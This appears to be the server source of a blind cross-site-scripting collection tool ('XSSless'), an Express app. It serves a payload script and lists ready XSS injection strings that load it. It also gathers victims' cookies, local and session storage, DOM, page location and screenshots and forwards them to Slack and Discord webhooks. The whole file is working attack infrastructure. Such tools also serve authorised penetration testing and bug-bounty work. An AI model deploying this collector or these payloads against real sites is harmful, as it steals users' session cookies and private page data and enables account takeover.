const express = require("express");
var bodyParser = require("body-parser");
var cors = require("cors");
const process = require("process");
var request = require("request");
const path = require("path");
const util = require('util');

// Support local development with .env
require("dotenv").config();

const port = process.env.PORT || 3000;
const imgbb_api_key = process.env.IMGBB_API_KEY || undefined;
const slack_incoming_webhook = process.env.SLACK_INCOMING_WEBHOOK || undefined;
const discord_incoming_webhook = process.env.DISCORD_INCOMING_WEBHOOK || undefined;

const app = express();
app.use(cors());

app.use(bodyParser.json({ limit: "15mb" }));
app.use(bodyParser.urlencoded({ limit: "15mb", extended: true }));

app.use(function (req, res, next) {
    // Headers
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Methods", "GET,POST");
    res.header("Access-Control-Allow-Headers", "Content-Type");
    next();
});

function sendBase64ImageToDiscord(base64Image) {
    try {
        var imageBuffer = Buffer.from(base64Image, "base64");

        request.post({
            url: discord_incoming_webhook,
            formData: {
                file: {
                    value: imageBuffer,
                    options: {
                        filename: "screenshot.png"
                    }
                }
            }
        }, function (error, response, body) {
            if (!error && response.statusCode == 200) {
                console.log('Webhook sent successfully:', body);
            } else {
                console.error('Error sending webhook:', error || body);
            }
        });
    } catch (error) {
        console.error('Error:', error);
    }
}

function generate_blind_xss_alert(body) {
    var alert = "*XSSless: Blind XSS Alert*\n";
    for (let k of Object.keys(body)) {
        if (k === "Screenshot") {
            continue;
        }

        if (body[k] === "") {
            alert += "*" + k + ":* " + "```None```" + "\n";
        } else {
            alert += "*" + k + ":* " + "```" + body[k] + "```" + "\n";
        }
    }
    return alert;
}

function generate_callback_alert(headers, data, url) {
    var alert = "\n\n:rotating_light: **Out-of-Band Callback Received!**\n\n";
    alert += `**IP Address        |** \`${data["Remote IP"]}\`\n`;
    alert += `**Request URI     |** \`${url}\`\n`;
    alert += `**Raw Headers**\n\`\`\``

    for (var key in headers) {
        if (headers.hasOwnProperty(key)) {
            alert += `${key}: ${headers[key]}\n`;
        }
    }
    alert += `\`\`\`\n\n`;
    return alert;
}

function generate_message_alert(body) {
    var alert = "*XSSless: Message Alert*\n";
    alert += "```\n" + body + "```\n";
    return alert;
}

app.get("/examples", (req, res) => {
    res.header("Content-Type", "text/plain");
    //var url = req.protocol + '://' + req.headers['host']
    var url = "https://" + req.headers["host"];
    var page = "";
    page += `\'"><script src="${url}"></script>\n\n`;
    page += `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'${url}\\';document.body.appendChild(a)')\n\n`;

    page += `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "${url}");a.send();</script>\n\n`;

    page += `<script>$.getScript("${url}")</script>`;
    res.send(page);
    res.end();
});

app.post("/c", async (req, res) => {
    let data = req.body;

    var location = "\n:rocket: **Blind XSS Triggered**\n\n";
    if (data["Location"]) {
        location += `**Location**                     | \`${data["Location"] || 'null'}\`\n`;
    }

    if (data["Referrer"]) {
        location += `**Referrer**                     | \`${data["Referrer"] || 'null'}\`\n`;
    }
    
    if (data["Origin"]) {
        location += `**Origin**                          | \`${ data["Origin"] || 'null'}\`\n`;
    }

    if (data["sessionStorage"]) {
        location += `**Session Storage**      | \`${ data["sessionStorage"] || 'null'}\`\n`;
    }

    if (data["localStorage"]) {
        location += `**Local Storage**          | \`${data["localStorage"] || 'null'}\`\n`;
    }

    if (data["Cookies"]) {
        location += `**Cookies**                      | \`${data["Cookies"] || 'null'}\`\n`;
    }
    
    location += `**DOM**\n\`\`\`${data["DOM"] || 'null'}\`\`\`\n\n`;

    // Upload our screenshot and only then send the Slack alert

    // Now handle the regular Slack alert
    data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const alert = generate_blind_xss_alert(data);
    data = { form: { payload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }) } };

    if (discord_incoming_webhook !== undefined && discord_incoming_webhook != "") {
        request.post(discord_incoming_webhook, { form: { username: "xless", content: location } }, function (error, response, body) {
            //console.log(body);
            console.log("[!] XSS blind payload triggered! Data sent to discord.\n");
        });
    }

    if (slack_incoming_webhook !== undefined && slack_incoming_webhook != "") {
        request.post(slack_incoming_webhook, data, (out) => {
            console.log("[!] XSS blind payload triggered! Data sent to slack.\n");
        });
    }

    // send screenshot
    if (req.body["Screenshot"]) {
        console.log("Sending screenshot.\n")
        const encoded_screenshot = req.body["Screenshot"].replace("data:image/png;base64,", "");

        sendBase64ImageToDiscord(encoded_screenshot)
    }

    res.send("ok\n");
    res.end();

});

/**
 * Route to ignore favicon :)
 */
app.get("/favicon*", async (req, res) => {

    res.send("ok");
    res.end();
});

app.all("/", (req, res) => {

    res.sendFile(path.join(__dirname + "/payload.js"));
});

app.all("/i", (req, res) => {
    res.send("<script src='/'></script>");
});

app.all("/*", (req, res) => {
    var headers = req.headers;
    var data = req.body;
    data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const alert = generate_callback_alert(headers, data, req.url);
    data = { form: { payload: JSON.stringify({ username: "BXSS", mrkdwn: true, text: alert }) } };

    if (discord_incoming_webhook !== undefined && discord_incoming_webhook != "") {
        request.post(discord_incoming_webhook, { form: { username: "bxss", content: alert } }, function (error, response, body) {
            //console.log(body);
            console.log("[!] request sent to discord.\n");
        });
    }

    if (slack_incoming_webhook !== undefined && slack_incoming_webhook != "") {
        request.post(slack_incoming_webhook, data, (out) => {
            console.log("[!] request sent to slack.\n");
        });
    }
    res.sendFile(path.join(__dirname + "/payload.js"));
});

app.listen(port, (err) => {
    if (err) throw err;
    console.log(`> Ready On Server http://localhost:${port}`);
});
